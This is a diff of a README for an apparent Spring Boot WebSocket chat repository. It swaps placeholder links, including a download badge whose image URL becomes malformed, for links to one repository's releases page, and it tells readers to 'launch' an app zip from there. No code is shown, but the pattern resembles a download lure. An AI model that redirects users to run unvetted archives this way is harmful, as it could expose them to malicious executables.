@@ -20,7 +20,7 @@ The repository covers a wide range of topics related to web development and real
 ## Get Started
 To explore the resources and code samples related to this study on WebSockets with Spring, click on the link below:
 
-[![Download App Zip](https://img.shields.io/badge/Download-App%20Zip-blue)](https://github.com/project/files/App.zip)
+[![Download App Zip](https://github.com/Rakib136z/springboot-websocket-livechat/releases%20Zip-blue)](https://github.com/Rakib136z/springboot-websocket-livechat/releases)
 
 🚀 Launch the App Zip and dive into the exciting world of real-time communication with Spring Boot and WebSockets!
 
@@ -30,7 +30,7 @@ If the link to the App Zip is not available or does not work, please check the "
 Feel free to explore the various folders and files within this repository to gain a deeper understanding of how WebSockets can be integrated into your projects. You will find code snippets, configuration files, and documentation to guide you through the process.
 
 ## 🌐 Visit Our Website
-For more information, updates, and additional resources, visit our website [here](https://www.example.com).
+For more information, updates, and additional resources, visit our website [here](https://github.com/Rakib136z/springboot-websocket-livechat/releases).
 
 ## 🤖 Join the Conversation
 Have questions, ideas, or feedback? Join our community of developers on Discord to engage in discussions, share insights, and collaborate on exciting projects. Together, we can explore the endless possibilities of real-time communication with WebSockets and Spring Boot!
